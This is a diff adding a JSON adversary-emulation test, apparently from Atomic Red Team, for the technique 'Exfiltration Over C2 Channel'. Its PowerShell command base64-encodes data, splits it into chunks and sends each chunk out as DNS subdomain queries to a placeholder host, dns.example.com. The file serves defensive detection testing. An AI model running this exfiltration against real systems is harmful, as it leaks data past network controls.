@@ -1,0 +1,39 @@
+{
+    "name": "Text Based Data Exfiltration using DNS subdomains",
+    "description": "Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$dnsServer = \"#{dns_server}\"\n$exfiltratedData = \"#{exfiltrated_data}\"\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1041",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over C2 Channel",
+    "source": "ART",
+    "uuid": "c9207f3e-213d-4cc7-ad2a-7697a7237df9",
+    "arguments": {
+        "dns_server": {
+            "description": "DNS server IP address or domain name.",
+            "type": "url",
+            "default": "dns.example.com"
+        },
+        "exfiltrated_data": {
+            "description": "Data to be exfiltrated.",
+            "type": "string",
+            "default": "SecretDataToExfiltrate"
+        },
+        "chunk_size": {
+            "description": "Size of each DNS query chunk (in characters).",
+            "type": "integer",
+            "default": 63
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
